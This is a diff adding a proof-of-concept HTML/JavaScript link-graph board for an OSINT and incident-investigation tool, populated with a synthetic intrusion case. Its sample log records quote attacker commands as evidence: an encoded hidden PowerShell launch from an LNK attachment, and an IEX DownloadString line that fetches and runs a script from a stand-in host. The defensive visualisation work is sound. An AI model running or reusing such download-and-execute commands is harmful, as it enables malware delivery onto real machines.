@@ -1,0 +1,225 @@
+<!doctype html>
+<html lang="en" data-theme="dark">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Osintrix POC B · Pinboard</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Barlow:wght@400;500;600;700&family=Barlow+Semi+Condensed:wght@500;600&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#121A21;--surface:#1B2731;--raise:#223240;--line:#2F4251;--text:#DCE6EC;--muted:#8FA3B1;--sel:#F4B740;--mal:#FF6B6B;--ok:#49C6A8;--sus:#E9A23B;--unk:#8FA3B1;--int:#6E8BFF;
+--sans:'Barlow',system-ui,sans-serif;--cond:'Barlow Semi Condensed','Barlow',sans-serif}
+:root[data-theme=light]{--bg:#E9EEF1;--surface:#FFFFFF;--raise:#F3F6F8;--line:#C7D2DA;--text:#14222C;--muted:#5A6D7A;--sel:#C98A00;--mal:#D33A3A;--ok:#1E8E73;--sus:#B87400;--unk:#6B7F8C;--int:#3F5FD9}
+*{box-sizing:border-box}
+html,body{margin:0;height:100%;background:var(--bg);color:var(--text);font:15px/1.45 var(--sans);overflow:hidden}
+button{font:inherit;color:inherit;background:none;border:0;cursor:pointer}
+:focus-visible{outline:2px solid var(--sel);outline-offset:2px;border-radius:4px}
+svg#board{position:fixed;inset:0;width:100%;height:100%;
+  background-image:radial-gradient(circle,var(--line) 1px,transparent 1.2px);background-size:28px 28px}
+/* top bar floats over canvas */
+.top{position:fixed;top:14px;left:14px;right:14px;display:flex;gap:10px;align-items:center;pointer-events:none}
+.top>*{pointer-events:auto}
+.pill{background:var(--surface);border:1px solid var(--line);border-radius:10px;display:flex;align-items:center;gap:4px;padding:5px}
+.case{padding:4px 10px 4px 6px;gap:10px}
+.case .dot{width:26px;height:26px;border-radius:7px;background:var(--sel);display:grid;place-items:center;color:#1b1300;font-weight:700;font-size:13px}
+.case b{font-weight:600}
+.case small{color:var(--muted);font-family:var(--cond);font-size:13px;margin-left:6px}
+.seg button{padding:5px 11px;border-radius:7px;color:var(--muted);font-weight:500}
+.seg button[aria-pressed=true]{background:var(--raise);color:var(--text)}
+.find{flex:1;max-width:420px;padding:0 12px;height:42px}
+.find input{flex:1;background:none;border:0;color:var(--text);font:inherit;outline:none}
+.find kbd,.k{font:600 11px var(--cond);border:1px solid var(--line);border-radius:4px;padding:0 5px;color:var(--muted)}
+.sp{flex:1}
+.cap{background:var(--sel);color:#1b1300;font-weight:700;padding:10px 16px;border-radius:9px}
+/* node labels */
+.n circle.ring{fill:var(--surface);stroke-width:2.5}
+.n text{font:600 13px var(--cond);fill:var(--text);paint-order:stroke;stroke:var(--bg);stroke-width:4px;stroke-linejoin:round}
+.n text.kind{font:700 11px var(--cond);fill:var(--muted);stroke:none}
+.n{cursor:pointer;transition:opacity .25s}
+.n.fade,.e.fade{opacity:.3}
+.n.off,.e.off,.n.off.fade,.e.off.fade{opacity:0;pointer-events:none}
+.e line{stroke:var(--line);stroke-width:1.6}
+.e.stated line{stroke:var(--muted)}
+.e text{font:500 11px var(--cond);fill:var(--muted);paint-order:stroke;stroke:var(--bg);stroke-width:4px}
+.e.x line{stroke:var(--mal);stroke-dasharray:5 5}
+.sel-halo{fill:none;stroke:var(--sel);stroke-width:2;stroke-dasharray:3 5}
+/* radial */
+.radial{position:fixed;width:0;height:0;pointer-events:none}
+.radial button{position:absolute;transform:translate(-50%,-50%);background:var(--surface);border:1px solid var(--line);border-radius:999px;padding:6px 12px;font:600 13px var(--cond);white-space:nowrap;pointer-events:auto;box-shadow:0 6px 18px rgba(0,0,0,.35);opacity:0;transition:opacity .18s, transform .18s}
+.radial.on button{opacity:1}
+.radial button:hover{border-color:var(--sel);color:var(--sel)}
+.radial button.danger{color:var(--mal)}
+/* card */
+.card{position:fixed;right:14px;top:72px;width:330px;max-height:calc(100% - 200px);overflow:auto;background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:16px 18px}
+.card .kind{font:600 12px var(--cond);color:var(--muted)}
+.card h2{margin:2px 0 10px;font-size:19px;font-weight:600;word-break:break-all;line-height:1.25}
+.vd{display:inline-flex;align-items:center;gap:6px;font:600 13px var(--cond);padding:3px 9px;border-radius:6px;border:1px solid}
+.card h3{font:600 13px var(--cond);color:var(--muted);margin:16px 0 6px}
+.card ul{list-style:none;margin:0;padding:0}
+.card li{padding:7px 0;border-top:1px solid var(--line);font-size:14px}
+.card li small{display:block;color:var(--muted);font-family:var(--cond)}
+.warn{margin-top:12px;border-radius:8px;padding:9px 11px;background:color-mix(in srgb,var(--mal) 14%,transparent);border:1px solid color-mix(in srgb,var(--mal) 45%,transparent);font-size:14px}
+/* legend */
+.legend{position:fixed;left:14px;bottom:96px;padding:10px 12px;flex-direction:column;align-items:flex-start;gap:6px;font:500 13px var(--cond)}
+.legend span{display:flex;gap:8px;align-items:center}
+.legend i{width:10px;height:10px;border-radius:50%;border:2.5px solid}
+/* scrubber */
+.scrub{position:fixed;left:14px;right:14px;bottom:14px;background:var(--surface);border:1px solid var(--line);border-radius:12px;padding:10px 16px 12px;display:grid;grid-template-columns:auto 1fr auto;gap:16px;align-items:center}
+.play{width:36px;height:36px;border-radius:50%;background:var(--raise);display:grid;place-items:center}
+.track{position:relative;height:44px}
+.ticks{position:absolute;inset:0 0 18px 0}
+.ticks i{position:absolute;bottom:0;width:3px;border-radius:2px;background:var(--muted)}
+.ticks i.m{background:var(--mal)}
+.track input{position:absolute;left:0;right:0;bottom:0;width:100%;accent-color:var(--sel)}
+.when{font:600 14px var(--cond);min-width:150px;text-align:right}
+.when small{display:block;color:var(--muted);font-weight:500}
+@media (max-width:820px){.card{left:10px;right:10px;width:auto;top:auto;bottom:96px;max-height:40vh}.legend,.find,.seg{display:none}.when{min-width:0}.radial button{font-size:12px;padding:5px 9px}}
+@media (prefers-reduced-motion:reduce){*{transition:none!important}}
+</style>
+</head>
+<body>
+<svg id="board" role="img" aria-label="Link graph for Op Lantern"></svg>
+<div class="top">
+  <div class="pill case"><span class="dot">L</span><b>Op Lantern</b><small>TN-2026-014 · 17 on board</small></div>
+  <div class="pill seg" role="group" aria-label="View"><button aria-pressed="true">Board</button><button aria-pressed="false">Timeline</button><button aria-pressed="false">Map</button><button aria-pressed="false">Report</button></div>
+  <div class="pill find"><svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="11" cy="11" r="7"/><path d="m20 20-3.5-3.5"/></svg><input id="q" placeholder="Find on the board, or paste an indicator" aria-label="Find on the board"><kbd>/</kbd></div>
+  <span class="sp"></span>
+  <button class="pill" id="themeB" aria-label="Switch theme" style="padding:10px 12px;font-weight:600">Light / dark</button>
+  <button class="cap">Capture</button>
+</div>
+<div class="pill legend" aria-label="Legend">
+  <span><i style="border-color:var(--mal)"></i>Malicious</span><span><i style="border-color:var(--sus)"></i>Suspicious</span><span><i style="border-color:var(--int)"></i>Ours / internal</span><span><i style="border-color:var(--unk)"></i>Not judged</span>
+  <span style="color:var(--muted)"><svg width="22" height="6"><line x1="0" y1="3" x2="22" y2="3" stroke="currentColor" stroke-width="2"/></svg>Stated in evidence</span>
+  <span style="color:var(--mal)"><svg width="22" height="6"><line x1="0" y1="3" x2="22" y2="3" stroke="currentColor" stroke-width="2" stroke-dasharray="4 3"/></svg>Crosses into another case</span>
+</div>
+<div class="radial" id="radial"></div>
+<aside class="card" id="card" aria-live="polite"></aside>
+<div class="scrub">
+  <button class="play" id="play" aria-label="Replay how the case grew">▶</button>
+  <div class="track"><div class="ticks" id="ticks"></div><input type="range" id="t" min="0" max="100" value="100" aria-label="Show the board as of"></div>
+  <div class="when" id="when"></div>
+</div>
+<script>
+/* Op Lantern sample data — taken from the OSINTrix demo case (synthetic, RFC 5737 / RFC 2606 ranges). */
+const CASES=[
+ {id:'c-lantern',code:'TN-2026-014',name:'Op Lantern',sub:'Invoice LNK intrusion',status:'Active',recs:27,ents:18,mal:6,open:3,upd:'15 Sep, 11:20'},
+ {id:'c-portal',code:'TN-2026-011',name:'Customer portal',sub:'Credential stuffing',status:'In review',recs:5,ents:3,mal:1,open:0,upd:'12 Sep, 16:05'},
+ {id:'c-lab',code:'LAB-2026-01',name:'Harbour photo',sub:'OSINT & forensics CTF lab',status:'Active',recs:8,ents:5,mal:0,open:2,upd:'21 Sep, 09:30'}];
+const RECS=[
+ {id:'r-mail',t:'2026-09-14 08:52:10',host:'MX01',src:'mail-gateway',title:'Invoice email delivered to finance',tag:'initial-access',body:'From: billing@lantern-invoice.example  To: j.okafor@corp.example  Subject: Invoice 4471 overdue  Attachment: Invoice_4471.pdf.lnk (1.9 KB)'},
+ {id:'r-lnk',t:'2026-09-14 08:57:33',host:'WS-FIN-07',src:'sysmon',title:'LNK opened, cmd spawns encoded PowerShell',tag:'execution',body:'EventID 1 ParentImage=C:\\Windows\\explorer.exe Image=C:\\Windows\\System32\\cmd.exe CommandLine="cmd.exe /c powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0A…" from Invoice_4471.pdf.lnk'},
+ {id:'r-ps',t:'2026-09-14 08:57:35',host:'WS-FIN-07',src:'powershell',title:'Script block downloads second stage',tag:'execution',body:"EventID 4104 ScriptBlockText: IEX (New-Object Net.WebClient).DownloadString('http://update-lamp.test/s.ps1')"},
+ {id:'r-dns',t:'2026-09-14 08:57:41',host:'WS-FIN-07',src:'sysmon',title:'DNS: update-lamp.test resolves',tag:'c2',body:'EventID 22 QueryName=update-lamp.test QueryResults=198.51.100.23 Image=powershell.exe'},
+ {id:'r-drop',t:'2026-09-14 08:58:02',host:'WS-FIN-07',src:'sysmon',title:'svchost.exe dropped in Public folder',tag:'payload',body:'EventID 11 TargetFilename=C:\\Users\\Public\\svchost.exe SHA256=9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a'},
+ {id:'r-c2a',t:'2026-09-14 08:58:15',host:'WS-FIN-07',src:'sysmon',title:'Outbound connection to 203.0.113.47:4444',tag:'c2',body:'EventID 3 Image=C:\\Users\\Public\\svchost.exe DestinationIp=203.0.113.47 DestinationPort=4444'},
+ {id:'r-c2e',t:'2026-09-14 09:02:15',host:'FW-EDGE',src:'firewall',title:'Beacon to 203.0.113.47:4444 (6 KB)',tag:'c2',body:'allow tcp 10.20.4.17:51052 -> 203.0.113.47:4444 bytes=6120'},
+ {id:'r-task',t:'2026-09-14 09:05:40',host:'WS-FIN-07',src:'security',title:'Scheduled task "OneDriveUpdate" created',tag:'persistence',body:'EventID 4698 TaskName=\\OneDriveUpdate Command=C:\\Users\\Public\\svchost.exe SubjectUserName=CORP\\j.okafor'},
+ {id:'r-lat',t:'2026-09-14 14:31:22',host:'DC01',src:'security',title:'Network logon to DC01 as svc_backup',tag:'lateral-movement',body:'EventID 4624 LogonType=3 TargetUserName=CORP\\svc_backup IpAddress=10.20.4.17 WorkstationName=WS-FIN-07'},
+ {id:'r-clear',t:'2026-09-14 14:40:55',host:'DC01',src:'security',title:'Security log cleared on DC01',tag:'anti-forensics',body:'EventID 1102 The audit log was cleared. SubjectUserName=CORP\\svc_backup'},
+ {id:'r-whois',t:'2026-09-15 10:20:00',host:'',src:'osint:whois',title:'Sender domain registered 13 days before the email',tag:'osint',body:'lantern-invoice.example registered 2026-09-01 via Example Registrar Inc.; registrant email n1ghtlamp@mail.example (privacy proxy not used).'},
+ {id:'r-forum',t:'2026-09-15 10:34:00',host:'',src:'osint:forum',title:'Handle @n1ghtlamp sells "lamp loader" on forum.example',tag:'osint',body:'Profile of @n1ghtlamp on forum.example (joined 2025-11) advertises a "lamp loader" builder; contact listed as n1ghtlamp@mail.example.'},
+ {id:'r-wallet',t:'2026-09-15 10:52:00',host:'',src:'osint:forum',title:'Forum post lists a BTC payment address',tag:'osint',body:'Pricing post by @n1ghtlamp: payment to bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh only.'}];
+/* indicator -> kind, verdict, cross-case sightings */
+const IOC={
+ 'billing@lantern-invoice.example':{k:'email',v:'malicious'},
+ 'j.okafor@corp.example':{k:'email',v:'victim'},
+ 'Invoice_4471.pdf.lnk':{k:'file',v:'malicious'},
+ 'update-lamp.test':{k:'domain',v:'malicious'},
+ 'http://update-lamp.test/s.ps1':{k:'url',v:'malicious'},
+ '198.51.100.23':{k:'ip',v:'malicious'},
+ '9f2c1d0b7e4a6c8f3b5d2e1a0c9b8f7e6d5c4b3a2f1e0d9c8b7a6f5e4d3c2b1a':{k:'hash',v:'malicious'},
+ '203.0.113.47':{k:'ip',v:'malicious',x:['Customer portal — 212 failed logins, 10 Sep']},
+ '10.20.4.17':{k:'ip',v:'internal'},
+ 'svc_backup':{k:'user',v:'suspicious'},
+ 'lantern-invoice.example':{k:'domain',v:'malicious'},
+ 'n1ghtlamp@mail.example':{k:'email',v:'unrated'},
+ '@n1ghtlamp':{k:'handle',v:'unrated'},
+ 'forum.example':{k:'domain',v:'unrated'},
+ 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh':{k:'wallet',v:'unrated'}};
+const QUESTIONS=[['What was the initial access vector?',1],['Which account moved laterally to DC01?',1],['Does 198.51.100.23 host other domains?',0],['Who operates @n1ghtlamp?',0],['Was anything exfiltrated in the 6 KB beacon?',0]];
+const PIVOTS={ip:['VirusTotal','AbuseIPDB','Shodan','Censys','GreyNoise'],domain:['VirusTotal','urlscan','crt.sh','SecurityTrails'],email:['Have I Been Pwned','Hunter','Epieos'],hash:['VirusTotal','MalwareBazaar','Hybrid Analysis'],url:['urlscan','VirusTotal'],wallet:['Blockchair','OXT'],handle:['WhatsMyName','Sherlock'],user:['Search evidence'],file:['Search evidence']};
+function sightings(ioc){return RECS.filter(r=>(r.body+' '+r.title).includes(ioc)).map(r=>r.id);}
+function markup(text,esc){ // wrap known indicators, longest first
+  const keys=Object.keys(IOC).sort((a,b)=>b.length-a.length);
+  let out='',i=0;
+  while(i<text.length){let hit=null;for(const k of keys){if(text.startsWith(k,i)){hit=k;break}}
+    if(hit){out+=`<mark class="ioc v-${IOC[hit].v}" data-ioc="${esc(hit)}" tabindex="0">${esc(hit)}</mark>`;i+=hit.length}else{out+=esc(text[i]);i++}}
+  return out;}
+const esc=s=>String(s).replace(/[&<>"']/g,c=>({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
+
+// node: id, label, kind, verdict, x,y (0..1000 x 0..620), t = time it entered the case
+const N=[
+ ['mail','billing@lantern-invoice.example','email','mal',250,130,'2026-09-14 08:52'],
+ ['jo','Jordan Okafor','person','int',90,250,'2026-09-14 08:52'],
+ ['lnk','Invoice_4471.pdf.lnk','file','mal',250,270,'2026-09-14 08:57'],
+ ['url','update-lamp.test/s.ps1','url','mal',250,410,'2026-09-14 08:57'],
+ ['dom2','update-lamp.test','domain','mal',120,520,'2026-09-14 08:57'],
+ ['ip1','198.51.100.23','ip','mal',300,580,'2026-09-14 08:57'],
+ ['hash','9f2c1d0b…3c2b1a','sha-256','mal',470,470,'2026-09-14 08:58'],
+ ['c2','203.0.113.47','ip','mal',640,570,'2026-09-14 08:58'],
+ ['svc','svc_backup','account','sus',470,300,'2026-09-14 14:31'],
+ ['dom','lantern-invoice.example','domain','mal',470,120,'2026-09-15 10:20'],
+ ['reg','Example Registrar Inc.','org','unk',470,20,'2026-09-15 10:20'],
+ ['nl','n1ghtlamp@mail.example','email','unk',690,140,'2026-09-15 10:20'],
+ ['h','@n1ghtlamp','handle','unk',760,300,'2026-09-15 10:34'],
+ ['forum','forum.example','forum','unk',930,240,'2026-09-15 10:34'],
+ ['ldr','Lamp loader','malware','mal',650,410,'2026-09-15 10:34'],
+ ['btc','bc1qxy2k…hx0wlh','btc wallet','unk',930,400,'2026-09-15 10:52'],
+ ['portal','Customer portal','other case','x',880,580,'2026-09-15 11:00']].map(([id,l,k,v,x,y,t])=>({id,l,k,v,x,y,t:Date.parse(t.replace(' ','T')+'Z')}));
+const L=[['mail','lnk','attached',1],['jo','lnk','opened',1],['lnk','url','fetches',1],['url','dom2','hosted on',1],['dom2','ip1','resolves to',1],['url','hash','drops',1],['hash','c2','beacons to',1],['hash','svc','ran as',0],
+ ['mail','dom','sent from',1],['dom','reg','registered via',1],['dom','nl','registrant',1],['nl','h','contact of',1],['h','forum','posts on',1],['h','ldr','sells',1],['ldr','hash','instance of',0],['h','btc','paid to',1],['c2','portal','same IP',2]];
+const COL={mal:'var(--mal)',sus:'var(--sus)',int:'var(--int)',unk:'var(--unk)',x:'var(--mal)'};
+const VLAB={mal:'Malicious',sus:'Suspicious',int:'Ours / internal',unk:'Not judged',x:'Another case'};
+const svg=document.getElementById('board'), NS='http://www.w3.org/2000/svg';
+let sel='h', asOf=Infinity;
+const tMin=Math.min(...N.map(n=>n.t)), tMax=Math.max(...N.map(n=>n.t));
+function layout(){const W=innerWidth,H=innerHeight, w=Math.min(W-(W>820?400:40),1100), h=H-240;
+  const ox=W>820?40:20, oy=90; N.forEach(n=>{n.px=ox+n.x/1000*w; n.py=oy+n.y/620*h});}
+function draw(){
+  layout(); svg.innerHTML='';
+  const neigh=new Set(sel?[sel]:[]); L.forEach(([a,b])=>{if(a===sel)neigh.add(b); if(b===sel)neigh.add(a)});
+  const vis=n=>n.t<=asOf; const S=N.find(n=>n.id===sel); if(S&&!vis(S)) neigh.clear();
+  for(const [a,b,lab,s] of L){const A=N.find(n=>n.id===a),B=N.find(n=>n.id===b);
+    const g=document.createElementNS(NS,'g'); g.setAttribute('class','e '+(s===1?'stated':s===2?'x':'')+(!vis(A)||!vis(B)?' off':'')+(neigh.size&&!(neigh.has(a)&&neigh.has(b))?' fade':''));
+    g.innerHTML=`<line x1="${A.px}" y1="${A.py}" x2="${B.px}" y2="${B.py}"/><text x="${(A.px+B.px)/2}" y="${(A.py+B.py)/2-4}" text-anchor="middle">${esc(lab)}</text>`; svg.appendChild(g);}
+  for(const n of N){const g=document.createElementNS(NS,'g'); g.setAttribute('class','n'+(vis(n)?'':' off')+(neigh.size&&!neigh.has(n.id)?' fade':''));
+    g.setAttribute('tabindex','0'); g.setAttribute('role','button'); g.setAttribute('aria-label',n.l+', '+n.k+', '+VLAB[n.v]); g.dataset.id=n.id;
+    const r=n.v==='x'?16:20;
+    g.innerHTML=`${sel===n.id?`<circle class="sel-halo" cx="${n.px}" cy="${n.py}" r="${r+9}"/>`:''}<circle class="ring" cx="${n.px}" cy="${n.py}" r="${r}" stroke="${COL[n.v]}" ${n.v==='x'?'stroke-dasharray="4 3"':''}/>
+      <text class="kind" x="${n.px}" y="${n.py+4}" text-anchor="middle">${({email:'@',person:'P',file:'LNK',url:'URL',domain:'DNS',ip:'IP','sha-256':'#',account:'ACC',org:'ORG',handle:'@h',forum:'WEB',malware:'MAL','btc wallet':'₿','other case':'CASE'})[n.k]}</text>
+      <text x="${n.px}" y="${n.py+r+16}" text-anchor="middle">${esc(n.l)}</text>`;
+    svg.appendChild(g);}
+  radial(); card();
+}
+function radial(){const R=document.getElementById('radial'); const n=N.find(x=>x.id===sel);
+  if(!n||n.t>asOf||innerWidth<=820){R.className='radial';R.innerHTML='';return}
+  const acts=[['Expand from evidence',''],['Look it up',''],['Mark malicious','danger'],['Shortest path to…',''],['Watch',''],['Add note','']];
+  R.style.left=n.px+'px'; R.style.top=n.py+'px';
+  R.innerHTML=acts.map(([a,c],i)=>{const ang=-Math.PI/2+i*(2*Math.PI/acts.length), rr=innerWidth>820?92:72; return `<button class="${c}" style="left:${Math.cos(ang)*rr*1.35}px;top:${Math.sin(ang)*rr}px">${a}</button>`}).join('');
+  requestAnimationFrame(()=>R.className='radial on');}
+function card(){const c=document.getElementById('card'); const n=N.find(x=>x.id===sel);
+  if(!n){c.innerHTML=`<div class="kind">Board</div><h2>Op Lantern</h2><p style="color:var(--muted);margin:0">Select anything on the board to see what the evidence says about it. Drag the time bar to replay how the case grew.</p>`;return}
+  const links=L.filter(([a,b])=>a===n.id||b===n.id).map(([a,b,lab])=>{const o=N.find(x=>x.id===(a===n.id?b:a));return `<li>${esc(lab)} <b>${esc(o.l)}</b><small>${o.k} · ${VLAB[o.v].toLowerCase()}</small></li>`}).join('');
+  const recs=RECS.filter(r=>(r.body+r.title).includes(n.l.replace('…','')) ).slice(0,4);
+  c.innerHTML=`<div class="kind">${esc(n.k)}</div><h2>${esc(n.l)}</h2><span class="vd" style="color:${COL[n.v]};border-color:${COL[n.v]}">● ${VLAB[n.v]}</span>
+   ${n.id==='h'?`<div class="warn" style="background:color-mix(in srgb,var(--sel) 14%,transparent);border-color:color-mix(in srgb,var(--sel) 50%,transparent)"><b>Look at this next.</b> Not judged yet, but linked to three malicious items: the sender domain, Lamp loader and the payment wallet.</div>`:''}
+   ${n.id==='c2'?`<div class="warn"><b>Crosses cases.</b> The same IP ran 212 failed logins against the customer portal on 10 Sep.</div>`:''}
+   <h3>Connections</h3><ul>${links}</ul>
+   ${recs.length?`<h3>From the evidence</h3><ul>${recs.map(r=>`<li>${esc(r.title)}<small>${r.t.slice(5,16)} · ${esc(r.src)}</small></li>`).join('')}</ul>`:''}
+   <h3>Added</h3><p style="margin:0;color:var(--muted);font-family:var(--cond)">${new Date(n.t).toUTCString().slice(5,22)} UTC</p>`;}
+function ticks(){document.getElementById('ticks').innerHTML=N.map(n=>`<i class="${n.v==='mal'?'m':''}" style="left:${(n.t-tMin)/(tMax-tMin)*100}%;height:${10+(n.v==='mal'?14:6)}px"></i>`).join('');}
+function setT(v){asOf=v>=100?Infinity:tMin+(tMax-tMin)*v/100; const shown=N.filter(n=>n.t<=asOf).length;
+  document.getElementById('when').innerHTML=(v>=100?'Everything':new Date(asOf).toUTCString().slice(5,22))+`<small>${shown} of ${N.length} on the board</small>`; draw();}
+document.getElementById('t').oninput=e=>setT(+e.target.value);
+svg.addEventListener('click',e=>{const g=e.target.closest('.n'); sel=g?(sel===g.dataset.id?null:g.dataset.id):null; draw();});
+svg.addEventListener('keydown',e=>{if(e.key==='Enter'){const g=e.target.closest('.n'); if(g){sel=g.dataset.id;draw();}}});
+document.addEventListener('keydown',e=>{if(e.key==='Escape'){sel=null;draw()} if(e.key==='/'&&e.target.tagName!=='INPUT'){e.preventDefault();document.getElementById('q').focus()}});
+document.getElementById('q').oninput=e=>{const q=e.target.value.toLowerCase(); const m=N.find(n=>q&&n.l.toLowerCase().includes(q)); if(m){sel=m.id;draw()}};
+let timer=null; document.getElementById('play').onclick=()=>{const r=document.getElementById('t'); if(timer){clearInterval(timer);timer=null;return} r.value=0; setT(0);
+  timer=setInterval(()=>{r.value=Math.min(100,+r.value+2); setT(+r.value); if(+r.value>=100){clearInterval(timer);timer=null}},80)};
+document.getElementById('themeB').onclick=()=>{const h=document.documentElement; h.dataset.theme=h.dataset.theme==='dark'?'light':'dark'};
+addEventListener('resize',draw);
+ticks(); setT(100);
+</script>
+</body>
+</html>
